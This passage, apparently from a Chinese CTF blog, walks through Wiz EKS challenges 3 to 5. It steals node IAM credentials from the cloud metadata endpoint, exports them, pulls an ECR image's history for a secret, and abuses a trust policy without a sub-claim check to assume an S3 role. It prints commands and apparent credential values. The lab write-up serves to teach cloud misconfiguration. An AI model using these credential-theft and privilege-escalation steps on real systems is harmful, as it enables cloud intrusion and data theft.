<p>kubectl get pods -o json</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;imageID&quot;: &quot;688655246681.dkr.ecr.us-west-1.amazonaws.com&#x2F;central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01&quot;,</span><br></pre></td></tr></table></figure>

<p>当然，直接pull也不行。</p>
<p>题目给出了当前是在AWS的EKS中，我们的目的是从EKS横向到AWS中。</p>
<p>通过在EKS中访问169.254.169.254/latest/meta-data可以获取一些信息</p>
<p>通过访问<strong>169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole</strong>可以获取IAM相关的信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -s 169.254.169.254&#x2F;latest&#x2F;meta-data&#x2F;iam&#x2F;security-credentials&#x2F;eks-challenge-cluster-nodegroup-NodeInstanceRole</span><br><span class="line">&#123;&quot;AccessKeyId&quot;:&quot;ASIA2AVYNEVM2TORP3VO&quot;,&quot;Expiration&quot;:&quot;2023-12-24 06:56:25+00:00&quot;,&quot;SecretAccessKey&quot;:&quot;kDLFtTHNjzPec5X71YL3BzeUvDzWyJxPuws7qQjf&quot;,&quot;SessionToken&quot;:&quot;FwoGZXIvYXdzEN&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;wEaDOfArbgAczkmiTYjGCK3AVUnVd1OaYk56+8XRY9NBwfNpcEMr3nEzeV&#x2F;&#x2F;1Ln1qF9AL2c+dFO9iZKDaj8sVy7nx&#x2F;2CKbb9uxEO0cSJpAUB2blFauosGC4IrTcF1u9oqT2px&#x2F;i0+EtLqbj+tW4CMezwIzWLe1yFVURFRuwET3hQFWJnFVmOvJ9JtfNpqV5TjSt2vzK8HuDFREDzP7tj6yy57iKNJRwvpA1TKql0RXRhyotE8ADkvYxkZHwNBM4wcJUXcWgXJA0USiJkJ+sBjIttqoyUlIC7cLuqzE8SZc9VzQc6TTwriI1Xuz7nAa0qRGjNcsJqepxgARs0CIe&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>到这儿就非常简单了，直接给了AK SK session key</p>
<p>在终端里面执行如下命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export AWS_SECRET_ACCESS_KEY&#x3D;kDLFtTHNjzPec5X71YL3BzeUvDzWyJxPuws7qQjf</span><br><span class="line">export AWS_ACCESS_KEY_ID&#x3D;ASIA2AVYNEVM2TORP3VO</span><br><span class="line">export AWS_SESSION_TOKEN&#x3D;FwoGZXIvYXdzEN&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;wEaDOfArbgAczkmiTYjGCK3AVUnVd1OaYk56+8XRY9NBwfNpcEMr3nEzeV&#x2F;&#x2F;1Ln1qF9AL2c+dFO9iZKDaj8sVy7nx&#x2F;2CKbb9uxEO0cSJpAUB2blFauosGC4IrTcF1u9oqT2px&#x2F;i0+EtLqbj+tW4CMezwIzWLe1yFVURFRuwET3hQFWJnFVmOvJ9JtfNpqV5TjSt2vzK8HuDFREDzP7tj6yy57iKNJRwvpA1TKql0RXRhyotE8ADkvYxkZHwNBM4wcJUXcWgXJA0USiJkJ+sBjIttqoyUlIC7cLuqzE8SZc9VzQc6TTwriI1Xuz7nAa0qRGjNcsJqepxgARs0CIe</span><br></pre></td></tr></table></figure>

<p>执行之后可以env看一下有没有写入</p>
<p><img src="http://cdn.polowong.top/image-20231224135956677.png" alt="image-20231224135956677"></p>
<p>执行命令<strong>aws sts get-caller-identity</strong> 查看当前权限（aws sts用于创建可控制对您的 Amazon 资源的访问的临时安全凭证，并将这些凭证提供给受信任用户，总而言之和身份认证相关）</p>
<p><img src="http://cdn.polowong.top/image-20231224140044059.png" alt="image-20231224140044059"></p>
<p>我们的目的是登录docker pull image，由于已经接管了aws权限，所以可以接管ecr生成登录密码</p>
<p><strong>aws ecr get-login-password –region us-west-1</strong>（这个region是我通过读取<strong>kubectl get pods -o json</strong>命令结果看到的）</p>
<p>这里面必须指定region，否则密码不对，后面登录不上</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJwYXl....M1fQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<p>接下来用这个密码登录docker就ok，这里使用crane登录</p>
<p><strong>aws ecr get-login-password | crane auth login –username AWS –password-stdin 688655246681.dkr.ecr.us-west-1.amazonaws.com</strong></p>
<p><img src="http://cdn.polowong.top/image-20231224140630965.png" alt="image-20231224140630965"></p>
<p>查看image的config</p>
<p><strong>crane config 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;architecture&quot;:&quot;amd64&quot;,&quot;config&quot;:&#123;&quot;Env&quot;:[&quot;PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin&quot;],&quot;Cmd&quot;:[&quot;&#x2F;bin&#x2F;sleep&quot;,&quot;3133337&quot;],&quot;ArgsEscaped&quot;:true,&quot;OnBuild&quot;:null&#125;,&quot;created&quot;:&quot;2023-11-...</span><br><span class="line">ARTIFACTORY_TOKEN&#x3D;wiz_eks_challenge&#123;the_history_of_container_images_could_reveal_the_secrets_to_the_future&#125; ARTIFACTORY_REPO&#x3D;base_repo &#x2F;bin&#x2F;sh -c pip install setuptools --index-url intrepo.eksclustergames.com # ...                             </span><br></pre></td></tr></table></figure>

<p>找到flag</p>
<p> <strong>wiz_eks_challenge{the_history_of_container_images_could_reveal_the_secrets_to_the_future}</strong></p>
<h2 id="challenge4"><a href="#challenge4" class="headerlink" title="challenge4"></a>challenge4</h2><p>题目描述</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Pod Break</span><br><span class="line">You&#39;re inside a vulnerable pod on an EKS cluster. Your pod&#39;s service-account has no permissions. Can you navigate your way to access the EKS Node&#39;s privileged service-account?</span><br></pre></td></tr></table></figure>

<p>看题目描述有点像传统渗透中的提权，先看下permission。。竟然什么都没有</p>
<p>这就有点难办了，直接搜eks提权肯定搜不到东西</p>
<p>当前在aws中，使用eks看下</p>
<p><strong>aws eks list-clusters</strong> 没有权限</p>
<p>看一下其他命令</p>
<p><strong>aws eks get-token</strong>需要 cluster-name或者cluster-id，但是这两个都没有</p>
<p>目前需要找的是cluster-name或者cluster-id，题目hint <strong>The convention for the IAM role of a node follows the pattern: [cluster-name]-nodegroup-NodeInstanceRole.</strong></p>
<p>这不巧了吗，aws sts get-caller-identity可以看到一串</p>
<p>arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282</p>
<p>那么就可以得到cluster-name就是eks-challenge-cluster，接下来就可以愉快的get-token</p>
<p><strong>aws eks get-token –cluster-name eks-challenge-cluster</strong></p>
<p><img src="http://cdn.polowong.top/image-20231224142258171.png" alt="image-20231224142258171"></p>
<p>那么使用这个token就可以去操作kubectl</p>
<p><img src="http://cdn.polowong.top/image-20231224142903732.png" alt="image-20231224142903732"></p>
<p><strong>kubectl get secret node-flag -o json –token k8s-a</strong></p>
<p>得到flag</p>
<p>d2l6X2Vrc19jaGFsbGVuZ2V7b25seV9hX3JlYWxfcHJvX2Nhbl9uYXZpZ2F0ZV9JTURTX3RvX0VLU19jb25ncmF0c30=</p>
<p><strong>wiz_eks_challenge{only_a_real_pro_can_navigate_IMDS_to_EKS_congrats}</strong></p>
<h2 id="challenge5"><a href="#challenge5" class="headerlink" title="challenge5"></a>challenge5</h2><p>题目描述</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">Container</span> <span class="string">Secrets</span> <span class="string">Infrastructure</span></span><br><span class="line"><span class="string">You&#x27;ve</span> <span class="string">successfully</span> <span class="string">transitioned</span> <span class="string">from</span> <span class="string">a</span> <span class="string">limited</span> <span class="string">Service</span> <span class="string">Account</span> <span class="string">to</span> <span class="string">a</span> <span class="string">Node</span> <span class="string">Service</span> <span class="string">Account!</span> <span class="string">Great</span> <span class="string">job.</span> <span class="string">Your</span> <span class="string">next</span> <span class="string">challenge</span> <span class="string">is</span> <span class="string">to</span> <span class="string">move</span> <span class="string">from</span> <span class="string">the</span> <span class="string">EKS</span> <span class="string">to</span> <span class="string">the</span> <span class="string">AWS</span> <span class="string">account.</span> <span class="string">Can</span> <span class="string">you</span> <span class="string">acquire</span> <span class="string">the</span> <span class="string">AWS</span> <span class="string">role</span> <span class="string">of</span> <span class="string">the</span> <span class="string">s3access-sa</span> <span class="string">service</span> <span class="string">account,</span> <span class="string">and</span> <span class="string">get</span> <span class="string">the</span> <span class="string">flag?</span></span><br><span class="line"></span><br><span class="line"><span class="string">IAM：</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;Policy&quot;:</span> &#123;</span><br><span class="line">        <span class="attr">&quot;Statement&quot;:</span> [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">&quot;Action&quot;:</span> [</span><br><span class="line">                    <span class="string">&quot;s3:GetObject&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;s3:ListBucket&quot;</span></span><br><span class="line">                ],</span><br><span class="line">                <span class="attr">&quot;Effect&quot;:</span> <span class="string">&quot;Allow&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;Resource&quot;:</span> [</span><br><span class="line">                    <span class="string">&quot;arn:aws:s3:::challenge-flag-bucket-3ff1ae2&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;arn:aws:s3:::challenge-flag-bucket-3ff1ae2/flag&quot;</span></span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="attr">&quot;Version&quot;:</span> <span class="string">&quot;2012-10-17&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="string">Trust</span> <span class="string">policy：</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;Version&quot;:</span> <span class="string">&quot;2012-10-17&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;Statement&quot;:</span> [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;Effect&quot;:</span> <span class="string">&quot;Allow&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;Principal&quot;:</span> &#123;</span><br><span class="line">                <span class="attr">&quot;Federated&quot;:</span> <span class="string">&quot;arn:aws:iam::688655246681:oidc-provider/oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">&quot;Action&quot;:</span> <span class="string">&quot;sts:AssumeRoleWithWebIdentity&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;Condition&quot;:</span> &#123;</span><br><span class="line">                <span class="attr">&quot;StringEquals&quot;:</span> &#123;</span><br><span class="line">                    <span class="attr">&quot;oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589:aud&quot;:</span> <span class="string">&quot;sts.amazonaws.com&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line"><span class="string">权限：</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;secrets&quot;:</span> [</span><br><span class="line">        <span class="string">&quot;get&quot;</span>,</span><br><span class="line">        <span class="string">&quot;list&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;serviceaccounts&quot;:</span> [</span><br><span class="line">        <span class="string">&quot;get&quot;</span>,</span><br><span class="line">        <span class="string">&quot;list&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;pods&quot;:</span> [</span><br><span class="line">        <span class="string">&quot;get&quot;</span>,</span><br><span class="line">        <span class="string">&quot;list&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;serviceaccounts/token&quot;:</span> [</span><br><span class="line">        <span class="string">&quot;create&quot;</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据题目描述，这题大概的考点是从EKS横向到AWS，最终读取S3 bucket中的flag</p>
<p>对于第一个IAM的配置，告诉了我们flag的位置</p>
<p>对于第二个 trust policy的配置，允许AssumeRoleWithWebIdentity操作的OIDC audience字段必须为<strong>sts.amazonaws.com</strong></p>
<p>对于第三个权限配置，允许get/list secrets、sa、pods、以及创建sa的token</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service account(sa)，顾名思义，主要是给service使用的一个账号。</span><br><span class="line">具体一点，就是为了让Pod中的进程、服务能访问k8s集群而提出的一个概念，基于service account，pod中的进程、服务能获取到一个username和令牌Token，从而调用kubernetes集群的api server。</span><br></pre></td></tr></table></figure>

<p>先在kubectl看一下有什么sa</p>
<p><img src="http://cdn.polowong.top/image-20231224143947159.png" alt="image-20231224143947159"></p>
<p>Kubectl create token s3access-sa 创建token没有权限，只能创建debug-sa的token</p>
<p>这题的考点在信任策略(TP)中，”在Kubernetes的TokenRequest API中，sub（subject）字段通常被用来表示令牌的主体，也就是令牌的所有者。这通常是一个服务账户。如果IAM信任策略没有对sub字段进行检查，那么任何能够生成有效OIDC令牌的服务账户都可以扮演这个IAM角色。”</p>
<p>那么我们可以生成一个debug-sa的token，指定audience为<strong>sts.amazonaws.com</strong></p>
<p><strong>kubectl create token debug-sa –audience sts.amazonaws.com</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhb..LUoBbGdG5PIg2JumEx0I2V2GvIAHuIUM-IZ1dsYkVJSRfqR8JQCf-NQqJIEg</span><br></pre></td></tr></table></figure>

<p>使用这个token，通过<strong>sts</strong>调用<strong>AssumeRoleWithWebIdentity</strong>方法，可以获得一个临时的身份认证凭据</p>
<p><strong>aws sts  assume-role-with-web-identity –role-arn xxx –role-session-name foobar –web-identity-token eyJ…</strong></p>
<p>其中，这个arn是s3access-sa的arn，通过命令 <strong>kubectl get  sa s3access-sa -o json</strong>  获得：<strong>arn:aws:iam::688655246681:role/challengeEksS3Role</strong></p>
<p>那么最终的命令就是</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws sts  assume-role-with-web-identity --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role  --role-session-name foobar --web-identity-token eyJhb..qJIEg</span><br></pre></td></tr></table></figure>



<p>ok，拿到三件套</p>
<p><img src="http://cdn.polowong.top/image-20231224144951158.png" alt="image-20231224144951158"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export AWS_SECRET_ACCESS_KEY&#x3D;guhNvCvXpCFMAIBauigUeDcy06a2hNwM&#x2F;CNliEWd</span><br><span class="line">export AWS_ACCESS_KEY_ID&#x3D;ASIA2AVYNEVM7VVFVCGV</span><br><span class="line">export AWS_SESSION_TOKEN&#x3D;IQoJb3Jp..pw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<p><img src="http://cdn.polowong.top/image-20231224145054792.png" alt="image-20231224145054792"></p>
<p>根据第一个IAM policy给的地址challenge-flag-bucket-3ff1ae2，找到flag</p>
<p><img src="http://cdn.polowong.top/image-20231224145130399.png" alt="image-20231224145130399"></p>
<p><strong>wiz_eks_challenge{w0w_y0u_really_are_4n_eks_and_aws_exp1oitation_legend}</strong></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>考察点比较基础，重在掌握aws、k8s基本的运维与操作命令。</p>
<p>同时aws身份认证、策略也是容易出问题的点（misconfiguration），要学会审计策略。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2371571">https://cloud.tencent.com/developer/article/2371571</a></p>
<p><a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/1398162">https://developer.aliyun.com/article/1398162</a></p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2371571">https://cloud.tencent.com/developer/article/2371571</a></p>

      
    </div>
    <div class="article-footer">
      <blockquote class="mt-2x">
  <ul class="post-copyright list-unstyled">
    
    <li class="post-copyright-link hidden-xs">
      <strong>Article Link</strong>
      <p style="width: 100%;
  word-wrap: break-word;
  word-break: break-all;
  overflow: hidden;">https://polosec.github.io/2023/12/24/%E4%B8%AA/</p>
    </li>
    
    <li class="post-copyright-license">
      <strong>Copyright Notice: </strong> All articles in this blog, unless otherwise stated, are under the<a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external"> CC BY 4.0 CN agreement</a>.Reprint please indicate the source!
    </li>
  </ul>
</blockquote>


<div class="panel panel-default panel-badger">
  <div class="panel-body">
    <figure class="media">
      <div class="media-left">
        <a href="https://github.com/polosec" target="_blank" class="img-burn thumb-sm visible-lg">
          <img src="http://cdn.polowong.top/1.jpg" class="img-rounded w-full" alt="">
        </a>
      </div>
      <div class="media-body">
        <h3 class="media-heading"><a href="https://github.com/polosec" target="_blank"><span class="text-dark">Polo</span><small class="ml-1x">CTFer&amp;Cybersec Researcher</small></a></h3>
        <div>Wong</div>
      </div>
    </figure>
  </div>
</div>


    </div>
  </article>
  
    
  <section id="comments">
  	
      <div id="uyan_frame"></div>
    
  </section>


  
</div>

  <nav class="bar bar-footer clearfix" data-stick-bottom>
  <div class="bar-inner">
  
  <ul class="pager pull-left">
    
    
    <li class="next">
      <a href="/2023/12/22/%E7%8E%84%E6%9C%BA-ER-01/" title="玄机应急响应靶场-redis-mysql-BT3-权限维持"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
    </li>
    
    
  </ul>
  
  
  <!-- Button trigger modal -->
  <button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>$</span></button>
  <!-- <div class="wave-icon wave-icon-danger btn-donate" data-toggle="modal" data-target="#donateModal">
    <div class="wave-circle"><span class="icon"><i class="icon icon-bill"></i></span></div>
  </div> -->
  
  
  <div class="bar-right">
    
    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
    
  </div>
  </div>
</nav>
  
<!-- Modal -->
<div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog">
  <div class="modal-dialog" role="document">
    <div class="modal-content donate">
      <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
      <div class="modal-body">
        <div class="donate-box">
          <div class="donate-head">
            <p>Maybe you could buy me a cup of coffee.</p>
          </div>
          <div class="tab-content">
            <div role="tabpanel" class="tab-pane fade active in" id="alipay">
              <div class="donate-payimg">
                <img src="/images/donate/vx.png" alt="Scan Qrcode" title="Scan" />
              </div>
              <p class="text-muted mv">Scan this qrcode</p>
              <p class="text-grey">Open alipay app scan this qrcode, buy me a coffee!</p>
            </div>
            <div role="tabpanel" class="tab-pane fade" id="wechatpay">
              <div class="donate-payimg">
                <img src="/images/donate/vx.png" alt="Scan Qrcode" title="Scan" />
              </div>
              <p class="text-muted mv">Scan this qrcode</p>
              <p class="text-grey">Open wechat app scan this qrcode, buy me a coffee!</p>
            </div>
          </div>
          <div class="donate-footer">
            <ul class="nav nav-tabs nav-justified" role="tablist">
              <li role="presentation" class="active">
                <a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="true"><i class="icon icon-alipay"></i> alipay</a>
              </li>
              <li role="presentation" class="">
                <a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="false"><i class="icon icon-wepay"></i> wechat payment</a>
              </li>
            </ul>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>



</main>

  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
	
	
    <ul class="social-links">
    	
        <li><a href="https://github.com/polosec" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
        
    </ul>

    <div class="copyright">
    	
        <div class="publishby">
        	Theme by <a href="https://github.com/polosec" target="_blank"> polosec </a>base on <a href="https://github.com/polosec/hexo-theme-pure" target="_blank">pure</a>.
        </div>
    </div>
</footer>
  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
<script>
window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
</script>

<script src="/js/plugin.min.js"></script>


<script src="/js/application.js"></script>


    <script>
(function (window) {
    var INSIGHT_CONFIG = {
        TRANSLATION: {
            POSTS: 'Posts',
            PAGES: 'Pages',
            CATEGORIES: 'Categories',
            TAGS: 'Tags',
            UNTITLED: '(Untitled)',
        },
        ROOT_URL: '/',
        CONTENT_URL: '/content.json',
    };
    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
})(window);
</script>

<script src="/js/insight.js"></script>






   
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





   
    
    <script defer type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid=[object Object]"></script>




  <script src="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.js"></script>
  <script>
  //利用 FancyBox 实现点击图片放大
  $(document).ready(function() {
    $('article img').not('[hidden]').not('.panel-body img').each(function() {
      var $image = $(this);
      var imageCaption = $image.attr('alt');
      var $imageWrapLink = $image.parent('a');
      if ($imageWrapLink.length < 1) {
        var src = this.getAttribute('src');
        var idx = src.lastIndexOf('?');
        if (idx != -1) {
          src = src.substring(0, idx);
        }
        $imageWrapLink = $image.wrap('<a href="' + src + '"></a>').parent('a');
      }
      $imageWrapLink.attr('data-fancybox', 'images');
      if (imageCaption) {
        $imageWrapLink.attr('data-caption', imageCaption);
      }
    });
    $().fancybox({
      selector: '[data-fancybox="images"]',
      hash: false,
      loop: false,
    });
  });
  </script>





</body>
</html>